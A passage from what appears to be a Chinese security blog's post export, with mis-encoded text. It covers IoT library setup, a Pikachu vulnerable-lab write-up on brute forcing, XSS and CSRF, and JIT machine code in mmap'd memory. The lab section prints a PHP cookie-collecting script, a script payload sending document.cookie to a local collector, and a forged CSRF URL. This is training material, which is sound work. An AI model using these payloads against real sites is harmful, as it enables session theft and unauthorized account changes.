-s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0 è¿˜æ˜¯ä¸è¡Œï¼Œcd /libç›®å½•ä¸‹ï¼Œåˆ æ‰äº†åŸæ¥çš„ld-uClibc.so.0æ–‡ä»¶ï¼Œç„¶åé‡æ–°è¾“å…¥å‘½ä»¤ã€‚ å‡ºç°æ–°æŠ¥é”™ï¼š/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0' è§£å†³æ–¹æ¡ˆï¼š 123sudo cp libuClibc-1.0.31.so /lib/sudo chown -R root:root /lib/libuClibc-1.0.32.sosudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0 è¿˜æ˜¯å‡ºç°äº†æ–‡ä»¶ä¸å¯¹åº”é—®é¢˜ï¼Œcd /libä¸‹åˆ æ‰äº†åŸæ¥çš„libc.so.0æ–‡ä»¶ï¼Œç»§ç»­é‡æ–°è¾“å…¥å‘½ä»¤ã€‚ è¿è¡ŒæˆåŠŸã€‚ os:ä¸ºäº†æ‰¾åˆ°å‡ºé”™ç‚¹ï¼Œæˆ‘çœŸæ˜¯å·²ç»åˆ‡æ¢ç›®å½•åˆ‡æ¢åˆ°å…¨éƒ½èƒŒä¸‹æ¥äº†â€¦â€¦çœŸçš„æ˜¯ä¸€æ­ç¯å¢ƒæ€»ä¼šç¢°åˆ°æ‰€æœ‰çš„é—®é¢˜â€¦â€¦éœ‰éœ‰æœ¬éœ‰äº†ã€‚ 0x04 é…ç½®ç½‘ç»œç¯å¢ƒ","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"pikachuæ¼æ´ç»ƒä¹ è®°å½•1","slug":"pikachuæ¼æ´ç»ƒä¹ 1","date":"2022-08-09T03:17:04.119Z","updated":"2022-08-11T14:21:46.355Z","comments":true,"path":"2022/08/09/pikachuæ¼æ´ç»ƒä¹ 1/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/","excerpt":"","text":"0x01 æš´åŠ›ç ´è§£åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£å¼€å¯bpæŠ“åŒ…ï¼Œå¯¹username,passwordå­—æ®µçš„å­—å…¸åšçˆ†ç ´ï¼Œå¾—åˆ°admin/123456. éªŒè¯ç ç»•è¿‡(on server)éšæ„è¾“å…¥è´¦æˆ·å¯†ç ï¼ŒbpæŠ“åŒ…ï¼Œå‘é€åˆ°é‡å‘å™¨ï¼Œä¿®æ”¹å¯†ç åé‡æ–°å‘é€ï¼Œå‘ç°æœªæŠ¥é”™éªŒè¯ç é”™è¯¯ï¼Œè¯æ˜éªŒè¯ç æ²¡æœ‰è¿›è¡Œæ—¶æ•ˆæ€§éªŒè¯ï¼Œå¯é‡å¤æäº¤ä½¿ç”¨ã€‚ å°†æµé‡åŒ…å‘é€åˆ°æµ‹è¯•å™¨ï¼Œå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œå­—å…¸çˆ†ç ´ï¼Œç™»å½•æˆåŠŸã€‚ éªŒè¯ç ç»•è¿‡(on client)åŒä¸Šæ­¥éª¤bpæŠ“åŒ…ï¼Œå¯¹ç”¨æˆ·å¯†ç è¿›è¡Œçˆ†ç ´å³å¯ã€‚åæ¥æŸ¥äº†ä¸€ä¸‹è¿™ä¿©çš„åŒºåˆ«ã€‚ æŸ¥çœ‹æºç ï¼Œè¾“å…¥çš„éªŒè¯ç åœ¨æœ¬åœ°éªŒè¯ï¼š å¯ä»¥åœ¨bpä¸Šä¸è¾“å…¥éªŒè¯ç æˆ–è¾“å…¥é”™è¯¯éªŒè¯ç éƒ½å¯ä»¥çˆ†ç ´ã€‚ tokené˜²çˆ†ç ´ï¼Ÿ token:tokenæ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä»¥ä½œå®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚çš„ä¸€ä¸ªä»¤ç‰Œï¼Œå½“ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªtokenä¾¿å°†æ­¤tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä»¥åå®¢æˆ·ç«¯åªéœ€è¦å¸¦ç€è¿™ä¸ªtokenå‰æ¥è¯·æ±‚æ•°æ®å³å¯ã€‚ åŸºäºtokençš„èº«ä»½éªŒè¯ å®¢æˆ·ç«¯ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚ç™»å½• æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚å»éªŒè¯ç”¨æˆ·åå’Œå¯†ç  éªŒè¯æˆåŠŸåï¼ŒæœåŠ¡ç«¯ä¼šç­¾å‘ä¸€ä¸ªtokenï¼Œå†å°†tokenå‘é€ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ”¶åˆ°tokenåå¯ä»¥å°†å®ƒå­˜å‚¨èµ·æ¥ï¼Œæ¯”å¦‚æ”¾åœ¨cookieä¸­æˆ–Local Storageé‡Œã€‚ å®¢æˆ·ç«¯æ¯æ¬¡å‘æœåŠ¡ç«¯è¯·æ±‚èµ„æºçš„æ—¶å€™éœ€è¦å¸¦ç€æœåŠ¡ç«¯ç­¾å‘çš„token æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯å®¢æˆ·ç«¯è¯·æ±‚é‡Œå¸¦ç€çš„tokenï¼Œå¦‚æœéªŒè¯æˆåŠŸï¼Œå°±åƒå®¢æˆ·ç«¯è¿”å›è¯·æ±‚çš„æ•°æ®ã€‚ appç™»å½•çš„æ—¶å€™å‘é€åŠ å¯†çš„ç”¨æˆ·åå’Œå¯†ç åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨éªŒè¯ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœæˆåŠŸï¼Œä»¥æŸç§æ–¹å¼æ¯”å¦‚éšæœºç”Ÿæˆ32ä½çš„å­—ç¬¦ä¸²ä½œä¸ºtokenï¼Œå­˜å‚¨åˆ°æœåŠ¡å™¨ä¸­ï¼Œå¹¶è¿”å›tokenåˆ°app æäº¤ç”¨æˆ·å¯†ç æ—¶é¡µé¢ä¼šæäº¤ä¸€ä¸ªhiddenå±æ€§çš„tokenå€¼ï¼Œæ¯æ¬¡æäº¤éƒ½ä¼šæ›´æ–°ï¼Œä½†æ¯æ¬¡äº§ç”Ÿçš„tokenä»¥æ˜æ–‡å½¢å¼ä¼ åˆ°å‰ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç ´è§£ä¹‹å‰è·å–tokenå€¼ï¼Œå¡«åˆ°å­—å…¸ä¸­å³å¯è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ åœ¨æµ‹è¯•å™¨ä¸­ï¼Œè®¾ç½®passwordå’Œtokenä¸¤ä¸ªå˜é‡ï¼Œä½¿ç”¨pitchforkã€‚ ç‚¹å‡»é€‰é¡¹ï¼Œæ›´æ”¹è¯·æ±‚å¼•æ“ä¸­çº¿ç¨‹æ•°ä¸º1ï¼Œé‡å®šå‘é€‰æ‹©æ€»æ˜¯ Grep-Extracté€‰æ‹©æ·»åŠ ï¼Œä¸­é—´è·å¾—å›åº”åŒ…ï¼Œé€‰æ‹©tokençš„å€¼å¤åˆ¶å¹¶é€‰å®šï¼Œç‚¹å‡»OK. å›åˆ°payload,setä¸º1æ—¶è®¾ç½®ç®€å•æ¸…å•ï¼Œä½¿ç”¨å­—å…¸æˆ–è‡ªå·±éšä¾¿è¾“å…¥å¯†ç ã€‚setä¸º2æ—¶è®¾ç½®é€’å½’æœç´¢ï¼Œå¹¶å¦‚å›¾é»è´´tokenå€¼ã€‚ å¼€å§‹æ”»å‡»ï¼Œæ ¹æ®ä¸åŒlengthæ‰¾å‡ºæ­£ç¡®å¯†ç ï¼Œçˆ†ç ´å®Œæˆã€‚ æ³¨ï¼šè¯¥æ–¹æ³•ç€å®é¸¡è‚‹ã€‚ 0x02 XSS(è·¨ç«™è„šæœ¬)XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œå±å®³å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ï¼Œå½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥è¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´ç²¾å¿ƒæ„é€ çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚ å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†ã€‚ è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥ã€‚ è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„é¢å‘¢ç»’è¿›è¡Œé€‚å½“è½¬ä¹‰ã€‚ åå°„æ€§xss(get)éšæ„è¾“å…¥å­—ç¬¦ä¸²ï¼Œå›æ˜¾who is xxx,i donâ€™t caref12æŸ¥çœ‹ï¼Œå…è®¸è¾“å…¥æœ€å¤§é•¿åº¦ä¸º20. æ›´æ”¹ä¸€ä¸‹å¯è¾“å…¥é•¿åº¦ï¼Œè¾“å…¥ä¸€ä¸ªç®€å•çš„xssè¯­å¥ï¼š&lt;script&gt;alert(\"XSS\")&lt;/script&gt; å‘ç°å¯ä»¥è§£æï¼Œå³å­˜åœ¨xssæ¼æ´ã€‚ è§‚å¯Ÿæºç å¯çŸ¥ï¼Œå®ƒå°†æäº¤çš„ä¿¡æ¯é‡æ–°å‘é€å›æ¥ï¼Œåå°æ²¡æœ‰å¯¹æˆ‘ä»¬æäº¤çš„ä¿¡æ¯åšä»»ä½•çš„æ¼æ´ã€‚GETå‹çš„xssï¼Œä¸€èˆ¬å°†å¸¦æœ‰xssçš„urlä¼ªè£…åå‘é€ç»™ç›®æ ‡å³å¯ã€‚ å¦‚æœæ˜¯postå‹xssï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨urlçš„æ–¹å¼è¿›è¡Œæ”»å‡»ã€‚ åˆ©ç”¨éœ€è¦ä¸€ä¸ªæ¥å—cookieçš„æœåŠ¡å™¨ï¼ˆ127.0.0.1ï¼š80ï¼‰ï¼Œæ¥æ¥æ”¶å—å®³ä¸»æœºçš„cookieã€‚ 12345&lt;?php$cookie=$_GET['cookie']; #fp=$fopen(\"cookie.txt\",\"a\");fwirte($fp,\"Cookie:\".$cookie.\"/n\")?&gt; æ„é€ ä¸€ä¸ªxssæ”»å‡»çš„jsä»£ç  &lt;script&gt;window.open(\"http://127.0.0.1/getcookie.php?cookie=\"+document.cookie);&lt;/script&gt; æ–°å¼¹å‡ºçª—å£æˆåŠŸè·å–åˆ°cookieã€‚ä½†æ˜¯cookie.txtä¸­å¹¶æ²¡æœ‰å­˜å‚¨åˆ°cookieå€¼â€¦â€¦ åå°„å‹xss(post)postå‹æ¼æ´ä¸€èˆ¬æ˜¯ä½¿ç”¨è¡¨å•æ–¹å¼è¿›è¡Œæäº¤ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨urlè¿›è¡Œæ”»å‡»ã€‚ å¯ä»¥é€šè¿‡htmlé¡µé¢æ–¹å¼æäº¤ï¼Œæ„é€ ä¸€ä¸ªè‡ªå·±çš„postä¸¢åˆ°è‡ªå·±çš„ç½‘ç«™ä¸Š éšæ„è¾“å…¥å­—ç¬¦æäº¤ï¼Œå‘ç°å®ƒå¹¶æœªåœ¨urlä¸­è¿›è¡Œæäº¤ï¼Œè¯´æ˜æˆ‘ä»¬ä¸èƒ½å°†æ¶æ„ä»£ç åµŒå…¥åˆ°urlä¸­å‘é€ã€‚ httpä¸­getå’Œpostçš„åŸºæœ¬åŒºåˆ«ï¼šgetæ–¹å¼åœ¨å®¢æˆ·ç«¯é€šè¿‡urlæäº¤æ•°æ®ï¼Œæ•°æ®åœ¨urlä¸­å¯ä»¥çœ‹åˆ°ï¼›Postæ–¹å¼ï¼Œæ•°æ®æ”¾ç½®åœ¨html headerå†…æäº¤ï¼Œæ•°æ®åœ¨urlä¸­çœ‹ä¸åˆ°ã€‚getåªèƒ½ä¼ è¾“æ¯”è¾ƒå°‘çš„æ•°æ®ï¼Œå®‰å…¨æ€§è¾ƒä½ï¼Œpostä¼ è¾“æ•°æ®è¾ƒå¤šã€‚ æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå¸¦æœ‰è¡¨å•æäº¤çš„é¡µé¢ï¼Œè®©ç”¨æˆ·åœ¨ç™»å½•å®Œæˆåå»ç‚¹å‡»ï¼Œå°±å¯ä»¥ç›—å–ç”¨æˆ·çš„cookieé‡Œã€‚ å­˜å‚¨å‹xsså­˜å‚¨å‹xssä¸‹æ”»å‡»è€…å¯ä»¥å°†è„šæœ¬æ³¨å…¥åˆ°åå°å­˜å‚¨èµ·æ¥æ„æˆæ›´åŠ æŒä¹…çš„å±å®³ã€‚å­˜å‚¨å‹xssåˆç§°æ°¸ä¹…å‹xssã€‚ 1.æ‰“å¼€å®éªŒï¼Œé¡µé¢æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå°è¯•è¾“å…¥1111ï¼Œå‘ç°è¾“å…¥è¢«å­˜å‚¨ã€‚è¾“å…¥å•å¼•å·åŒå¼•å·å°–æ‹¬å·ï¼Œå‘ç°å¯ä»¥æ­£å¸¸è¾“å‡ºï¼Œè¯´æ˜åå°æ²¡è¿›è¡Œè¿‡æ»¤ã€‚ 2.æ³¨å…¥&lt;script&gt;alert(\"XSS\")&lt;/script&gt; æäº¤åä¼šå‡ºç°å¼¹çª—ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢æ—¶éƒ½ä¼šå¼¹å‡ºï¼Œä¸åå°„å‹xssçš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨å‹xsså·²ç»è¢«å­˜å‚¨è¿›åå°ä»£ç ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ·æ–°éƒ½ä¼šå¼¹å‡ºXSSå¼¹çª—ã€‚æ‰€ä»¥å­˜å‚¨å‹xsså±å®³æ›´å¤§ï¼Œä¼šé•¿ä¹…å±å®³ç”¨æˆ·ã€‚ DOMå‹xssDOM:ä¸€ä¸ªä¸€ä¸ªè®¿é—®htmlçš„æ ‡å‡†ç¼–ç¨‹æ¥å£ï¼ŒDOMæ˜¯ä¸€ä¸ªå‰ç«¯æ¥å£ï¼Œæ²¡æœ‰å’Œåç«¯åšä»»ä½•çš„äº¤äº’ã€‚ 0x03 CSRFCSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œåœ¨csrfæ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼Œæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ï¼Œæ‰€ä»¥csrfæ”»å‡»ä¹Ÿæˆä¸ºâ€one clickâ€æ”»å‡». csrfæ”»å‡»æ»¡è¶³çš„æ¡ä»¶1.ç½‘ç«™æ²¡æœ‰å¯¹ä¸ªäººçš„ä¿¡æ¯ä¿®æ”¹çš„è¯·æ±‚è¿›è¡Œé˜²csrfå¤„ç†ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€  2.ç”¨æˆ·åœ¨ç™»å½•åå°çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»äº†æ”»å‡»è€…å‘é€çš„é“¾æ¥ï¼Œå¦‚æœç”¨æˆ·æ²¡ç™»é™†æˆ–æ²¡ç‚¹è¿æ¥éƒ½ä¸ä¼šæˆ csrfä¸xssçš„åŒºåˆ«csrfæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€Œxssæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚ å¦‚ä½•ç¡®è®¤ä¸€ä¸ªwebç³»ç»Ÿå­˜åœ¨csrfæ¼æ´ 1.å¯¹ç›®æ ‡ç½‘ç«™å¢åˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°ï¼Œå¹¶è§‚å¯Ÿå…¶é€»è¾‘ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«ä¼ªé€  ä¿®æ”¹ç®¡ç†å‘˜è´¦å·æ—¶ï¼Œå¹¶ä¸éœ€è¦éªŒè¯æ—§å¯†ç ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ï¼› å¯¹äºæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å¹¶æ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„tokenéªŒè¯ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ï¼› 2.ç¡®è®¤å‡­è¯çš„æœ‰æ•ˆæœŸ è™½ç„¶é€€å‡ºæˆ–å…³é—­äº†æµè§ˆå™¨ï¼Œä½†cookieä»ç„¶æœ‰æ•ˆï¼Œæˆ–è€…sessionå¹¶æ²¡æœ‰åŠæ—¶å›½ä¼ï¼Œå¯¼è‡´csrfæ”»å‡»å˜å¾—ç®€å•ã€‚ CSRF(get)ç™»å½•è´¦å·ï¼ŒæŠ“å–ä¿®æ”¹ä¸ªäººä¿¡æ¯æµé‡åŒ…ã€‚ å‘ç°å‚æ•°å¯ä»¥ç›´æ¥è¢«ä¿®æ”¹ï¼Œæœªåšä»»ä½•ç¡®è®¤æœºåˆ¶ï¼Œå¯ä»¥ç›´æ¥å°†urlä¼ªè£…æˆå„ç§htmlè®©å—å®³è€…ç‚¹å‡»ã€‚ å¯ä»¥æ„é€ å‡ºCSRFæ”»å‡»URL(bpæŠ“çš„ä¿®æ”¹ä¿¡æ¯çš„åŒ…ç›´æ¥å³é”®å¤åˆ¶ç½‘å€å³å¯): http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit è¯±ä½¿ç™»å½•çŠ¶æ€çš„ç”¨æˆ·ç‚¹å‡»urlå°±å¯ä»¥å®ŒæˆCSRFæ”»å‡»ã€‚ CSRF(post)å¦‚æœä¿®æ”¹ä¿¡æ¯çš„è¯·æ±‚æ–¹å¼æ˜¯POSTå‹çš„ï¼Œæ”»å‡»è€…åˆ™ä¸èƒ½é€šè¿‡æ„é€ æ¶æ„urlæ¥æ”»å‡»ã€‚ç±»ä¼¼äºxssçš„postå‹æ”»å‡»ï¼Œæ”»å‡»è€…ä¼šæ„é€ ä¸€ä¸ªè‡ªå·±çš„æ”»å‡»ç«™ç‚¹ï¼ˆæœåŠ¡å™¨ï¼‰,ç«™ç‚¹ä¸Šæœ‰ä¸€ä¸ªpoat.htmlï¼Œè¯±ä½¿ç”¨æˆ·ç‚¹å‡»è¯¥åœ°å€ã€‚å½“ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å‘å­˜åœ¨CSRFçš„æœåŠ¡å™¨æäº¤POSTè¯·æ±‚ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚ æ­¥éª¤åŒgetã€‚ä½†ä¸çŸ¥ä¸ºä½•æ—¶çµæ—¶ä¸çµã€‚ æ­£å¸¸ç™»å½•çŠ¶æ€ï¼š ç‚¹å‡»æ¶æ„urlåï¼Œç”¨æˆ·ä¿¡æ¯ç›´æ¥è¢«ä¿®æ”¹ã€‚ CSRF(Token)token: æ¯æ¬¡è¯·æ±‚éƒ½å¢åŠ ä¸€ä¸ªéšæœºç ï¼ˆéœ€è¦å¤Ÿéšæœºï¼Œä¸å®¹æ˜“è¢«ä¼ªé€ ï¼‰ï¼Œåå°æ¯æ¬¡å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯ï¼Œè¿™ä¸ªéšæœºç å°±æ˜¯tokenã€‚ å¦‚å›¾è·å–ä¿®æ”¹ä¿¡æ¯æµé‡åŒ…åå‘ç°å¢åŠ äº†tokenï¼Œæ— æ³•åˆ©ç”¨ã€‚ é˜²èŒƒCSRFæªæ–½ å¢åŠ tokenéªŒè¯ï¼šå¯¹å…³é”®æ“ä½œå¢åŠ tokenå‚æ•°ï¼Œtokenå€¼å¿…é¡»éšæœºï¼Œæ¯æ¬¡éƒ½ä¸ä¸€æ · å®‰å…¨çš„ä¼šè¯ç®¡ç†ï¼ˆé¿å…ä¼šè¯è¢«åˆ©ç”¨ï¼‰ ä¸è¦å†å®¢æˆ·ç«¯ä¿å­˜æ•æ„Ÿä¿¡æ¯ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯ï¼‰ æµ‹è¯•ç›´æ¥å…³é—­ï¼Œé€€å‡ºæ—¶çš„ä¼šè¯è¿‡æœŸæœºåˆ¶ï¼ˆä¸€èˆ¬æ˜¯15-20åˆ†é’Ÿï¼‰ï¼Œæ— æ“ä½œåˆ™è‡ªåŠ¨ç™»å…¥è¶…æ—¶ã€‚ è®¿é—®æ§åˆ¶å®‰å…¨ç®¡ç† æ•æ„Ÿä¿¡æ¯ä¿®æ”¹æ—¶éœ€è¦å¯¹èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯ï¼ˆå¦‚ä¿®æ”¹è´¦å·æ—¶éœ€è¦åˆ¤æ–­æ—§å¯†ç ï¼‰ æ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å°½é‡ä½¿ç”¨postï¼ˆpostå®‰å…¨æ€§é«˜äºgetï¼‰ é€šè¿‡httpå¤´éƒ¨ä¸­çš„refereræ¥é™åˆ¶é¡µé¢ï¼ˆä¿®æ”¹ä¸ªäººä¿¡æ¯çš„refererå¿…é¡»æ¥è‡ªæœ¬åŸŸï¼Œä¸å¯æ¥è‡ªå…¶ä»–åŸŸæˆ–æ— refererï¼‰ å¢åŠ éªŒè¯ç ï¼šä¸€èˆ¬ç”¨åœ¨ç™»å½•ï¼ˆé˜²æš´åŠ›ç ´è§£ï¼‰ï¼Œä¹Ÿå¯ç”¨äºå…¶ä»–é‡è¦ä¿¡æ¯æ“ä½œçš„è¡¨å•ä¸­ã€‚","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"JITå­¦ä¹ ","slug":"JITå­¦ä¹ ","date":"2022-08-09T03:17:04.108Z","updated":"2022-08-09T03:41:19.337Z","comments":true,"path":"2022/08/09/JITå­¦ä¹ /","link":"","permalink":"https://sinky.top/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JITåŸç†Just In Timeç¼–è¯‘ï¼Œä¹Ÿå«è¿è¡Œæ—¶ç¼–è¯‘ï¼Œä¸åŒäºC/C++è¯­è¨€ç›´æ¥è¢«ç¿»è¯‘æˆæœºå™¨æŒ‡ä»¤ï¼ŒjavacæŠŠjavaçš„æºæ–‡ä»¶ç¿»è¯‘æˆäº†classæ–‡ä»¶ï¼Œè€Œclassæ–‡ä»¶ä¸­å…¨éƒ½æ˜¯javaå­—èŠ‚ç ï¼Œé‚£ä¹ˆï¼ŒJVMåœ¨åŠ è½½äº†è¿™äº›classæ–‡ä»¶ä»¥åï¼Œé’ˆå¯¹è¿™äº›å­—èŠ‚ç ï¼Œé€æ¡å–å‡ºï¼Œé€æ¡æ‰§è¡Œï¼Œè¿™ç§æ–¹æ³•å°±æ˜¯è§£é‡Šæ‰§è¡Œã€‚ è¿˜æœ‰ä¸€ç§ï¼Œå°±æ˜¯å°†javaå­—èŠ‚ç é‡æ–°ç¼–è¯‘ä¼˜åŒ–ï¼Œç”Ÿæˆæœºå™¨ç ï¼Œè®©CPUç›´æ¥æ‰§è¡Œï¼Œè¿™æ ·ç¼–å‡ºæ¥çš„ä»£ç æ•ˆç‡æ›´é«˜ï¼Œé€šå¸¸æˆ‘ä»¬ä¸å¿…æŠŠæ‰€æœ‰çš„javaæ–¹æ³•éƒ½ç¼–è¯‘æˆæœºå™¨ç ï¼Œåªéœ€è¦æŠŠè°ƒç”¨æœ€é¢‘ç¹ï¼Œå æ®CPUæ—¶é—´æœ€é•¿çš„æ–¹æ³•æ‰¾å‡ºæ¥å°†å…¶ç¼–è¯‘æˆæœºå™¨ç ï¼Œè¿™ç§è°ƒç”¨æœ€é¢‘ç¹çš„javaæ–¹æ³•å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„çƒ­ç‚¹æ–¹æ³•ã€‚ æŠ€æœ¯ç‚¹ä»å¤§çš„æ¡†æ¶ï¼Œå°±æ˜¯ç”³è¯·ä¸€å—æ—¢æœ‰å†™æƒé™åˆæœ‰æ‰§è¡Œæƒé™çš„å†…å­˜ï¼Œç„¶åæŠŠä½ è¦ç¼–è¯‘çš„javaæ–¹æ³•ï¼Œç¿»è¯‘æˆæœºå™¨ç ï¼Œå†™å…¥åˆ°è¿™å—å†…å­˜é‡Œï¼Œå½“å†éœ€è¦è°ƒç”¨åŸæ¥çš„javaæ–¹æ³•æ—¶ï¼Œå°±è½¬å‘è°ƒç”¨è¿™å—å†…å­˜ã€‚ ä¾‹å­ï¼š 12345678 #include&lt;stdio.h&gt;int inc(int a) { return a + 1;}int main() { printf(\"%d\\n\", inc(3)); return 0;} objdump -d 1æŸ¥çœ‹å®ƒçš„æœºå™¨ç ã€‚ 123456780000000000400526 &lt;inc&gt;: 400526: 55 push %rbp#ä¿å­˜ä¸Šä¸€ä¸ªæ ˆå¸§çš„åŸºå€ï¼Œå¹¶æŠŠå½“å‰çš„æ ˆæŒ‡é’ˆèµ‹ç»™æ ˆåŸºå€å¯„å­˜å™¨ 400527: 48 89 e5 mov %rsp,%rbp 40052a: 89 7d fc mov %edi,-0x4(%rbp)#æŠŠediå­˜åˆ°æ ˆä¸Šã€‚åœ¨x64å¤„ç†å™¨ä¸Šï¼Œå‰6ä¸ªå‚æ•°éƒ½æ˜¯ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚çš„ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¼šä½¿ç”¨rdiï¼Œç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨ rsiï¼Œç­‰ç­‰ã€‚æ‰€ä»¥ edi é‡Œå­˜çš„å…¶å®å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ•´æ•° 3 40052d: 8b 45 fc mov -0x4(%rbp),%eax#æŠŠä¸Šä¸€æ­¥å­˜åˆ°æ ˆä¸Šçš„é‚£ä¸ªæ•´æ•°å†å­˜è¿› eax ä¸­ 400530: 83 c0 01 add $0x1,%eax#æŠŠ eax åŠ ä¸Š 1ï¼Œ ç„¶åå°±é€€æ ˆï¼Œè¿”å›ã€‚æŒ‰ç…§x64çš„è§„å®šï¼ˆABIï¼‰ï¼Œè¿”å›å€¼é€šè¿‡eaxä¼ é€’ 400533: 5d pop %rbp 400534: c3 retq æˆ‘ä»¬å‘ç°ï¼Œç¬¬ä¸‰å±€ç¬¬å››å±€å¥½åƒæ²¡æœ‰å¿…è¦ï¼Œgccé»˜è®¤æƒ…å†µä¸‹ç”Ÿæˆçš„æœºå™¨ç æœ‰ç‚¹æ²¡å¿…è¦ï¼Œå®ƒæ€»è¦æŠŠå…¥å‚æ”¾åˆ°æ ˆä¸Šï¼Œä½†å…¶å®æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥æŠŠå‚æ•°ä»rdiä¸­æ”¾å…¥åˆ°raxä¸­çš„ï¼Œåœ¨è¿è¡Œæ—¶ä¿®æ”¹incçš„é€»è¾‘å³å¯ï¼š 1234567891011121314151617181920 #include&lt;stdio.h&gt; #include&lt;memory.h&gt; #include&lt;sys/mman.h&gt;typedef int (* inc_func)(int a); int main() { char code[] = { 0x55, // push rbp 0x48, 0x89, 0xe5, // mov rsp, rbp 0x89, 0xf8, // mov edi, eax 0x83, 0xc0, 0x01, // add $1, eax 0x5d, // pop rbp 0xc3 // ret }; void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, code, sizeof(code)); inc_func p_inc = (inc_func)temp; 